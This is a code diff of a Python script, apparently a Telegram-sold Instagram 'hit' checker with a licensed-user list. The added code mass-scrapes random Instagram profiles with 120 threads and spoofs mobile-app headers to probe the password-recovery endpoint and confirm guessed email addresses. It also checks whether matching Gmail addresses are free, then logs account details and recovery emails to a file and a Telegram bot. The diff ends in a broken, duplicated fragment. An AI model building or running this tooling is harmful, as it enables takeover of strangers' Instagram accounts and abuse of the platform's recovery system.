@@ -1,4 +1,4 @@
-# import datetime
+import datetime
 import sys
 
 # === CONFIGURATION START ===
@@ -6,7 +6,7 @@ import sys
 # Format: 'telegram_id': {'name': 'Name', 'expiry': 'YYYY-MM-DD HH:MM:SS'}
 ALLOWED_USERS = {
     "7613526267": {"name": "User1", "expiry": "2029-08-20 23:59:59"},
-    "5118901928": {"name": "User2", "expiry": "2029-08-21 12:00:00"},
+    "5118901928": {"name": "User2", "expiry": "2028-08-21 12:00:00"},
     "555111333": {"name": "VipUser", "expiry": "2025-09-01 00:00:00"},
 }
 
@@ -309,6 +309,167 @@ def check(email):
         CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
     }
     data = {
+        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
+                      json.dumps({
+                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                          'adid': uui,
+                          'guid': uui,
+                          'device_id': device_id,
+                          'query': email
+                      })),
+        IG_SIG_KEY_VERSION: '4'
+    }
+    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
+    if email in response:
+        if zrykr_domain in email:
+            check_gmail(email)
+        good_ig += 1
+        update_stats()
+    else:
+        bad_insta += 1
+        update_stats()
+
+def rest(user):
+    try:
+        headers = {
+            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+            'X-Pigeon-Rawclienttime': '1700251574.982',
+            'X-IG-Connection-Speed': '-1kbps',
+            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+            'X-IG-Bandwidth-TotalBytes-B': '0',
+            'X-IG-Bandwidth-TotalTime-MS': '0',
+            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
+                                   'bb343b0862d663f31a3c63f13a9f31c0'),
+            'X-IG-Connection-Type': 'WIFI',
+            'X-IG-Capabilities': '3brTvw==',
+            'X-IG-App-ID': '567067343352427',
+            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
+                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
+                                'en_GB; 161478664)'),
+            'Accept-Language': 'en-GB, en-US',
+            COOKIE_HEADER: COOKIE_VALUE,
+            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
+            'Accept-Encoding': 'gzip, deflate',
+            'Host': 'i.instagram.com',
+            'X-FB-HTTP-Engine': 'Liger',
+            'Connection': 'keep-alive',
+            'Content-Length': '356'
+        }
+        data = {
+            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
+                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
+                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
+                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
+                          '"device_id":"android-b93ddb37e983481c",'
+                          '"query":"' + user + '"}'),
+            IG_SIG_KEY_VERSION: '4'
+        }
+        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
+        zrykrporno = response.get('email', 'Reset None')
+    except:
+        zrykrporno = 'Reset None'
+    return zrykrporno
+
+def date(hy):
+    try:
+        ranges = [
+            (1279000, 2010),
+            (17750000, 2011),
+            (279760000, 2012),
+            (900990000, 2013),
+            (1629010000, 2014),
+            (2500000000, 2015),
+            (3713668786, 2016),
+            (5699785217, 2017),
+            (8597939245, 2018),
+            (21254029834, 2019),
+        ]
+        for upper, year in ranges:
+            if hy <= upper:
+                return year
+        return 2023
+    except Exception:
+        pass
+
+def InfoAcc(username, domain):
+    global total_hits
+    account_info = infoinsta.get(username, {})
+    user_id = account_info.get('pk')
+    full_name = account_info.get('full_name')
+    followers = account_info.get('follower_count', 0)
+    following = account_info.get('following_count')
+    posts = account_info.get('media_count')
+    bio = account_info.get('biography')
+    meta_status = "Meta Active ✅" if followers > 50 else "Meta Not Active ✖️"
+    total_hits += 1
+    info_text = f"""
+𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 
+═══════════════════
+🇮🇳𝐇𝐈𝐓 : {total_hits}
+🇮🇳𝐍𝐀𝐌𝐄 : {full_name}
+🇮🇳𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {username}
+🇮🇳𝐄𝐌𝐀𝐈𝐋 : {username}@{domain}
+🇮🇳𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐒 : {followers} 
+🇮🇳𝐅𝐎𝐋𝐋𝐎𝐖 : {following} 
+🇮🇳𝐏𝐎𝐒𝐓 : {posts} 
+🇮🇳𝐃𝐀𝐓𝐄 : 2010-19
+🇮🇳𝐁𝐈𝐎 : {bio} 
+🇮🇳𝐌𝐄𝐓𝐀 : {meta_status}
+🇮🇳𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 : None
+🇮🇳𝐑𝐄𝐒𝐓 : {rest(username)}
+🇮🇳𝐋𝐈𝐍𝐊 : https://www.instagram.com/{username}
+══════════════════
+Admin • @sf_army
+"""
+    with open('ranveer.txt', 'a') as f:
+        f.write(info_text + "\n")
+    try:
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
+    except Exception:
+        pass
+
+def zrykr_python():
+    while True:
+        data = {
+            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
+            'variables': json.dumps({
+                'id': int(random.randrange(2500000000, 21254029834)),
+                'render_surface': 'PROFILE'
+            }),
+            'doc_id': '25618261841150840'
+        }
+        headers = {'X-FB-LSD': data['lsd']}
+        try:
+            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
+            account = response.json().get('data', {}).get('user', {})
+            username = account.get('username')
+            if username:
+                followers = account.get('follower_count', 0)
+                if followers < 30: # minimum Followers Set.
+                    continue
+                infoinsta[username] = account
+                emails = [username + zrykr_domain]
+                for email in emails:
+                    check(email)
+        except Exception:
+            pass
+
+
+def stats_loop():
+    while True:
+        update_stats()
+        time.sleep(1)
+
+Thread(target=stats_loop, daemon=True).start()
+
+for _ in range(120):
+    Thread(target=zrykr_python).start()
+    
+    
+    
+    
+    
+ata = {
         SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                       json.dumps({
                           '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
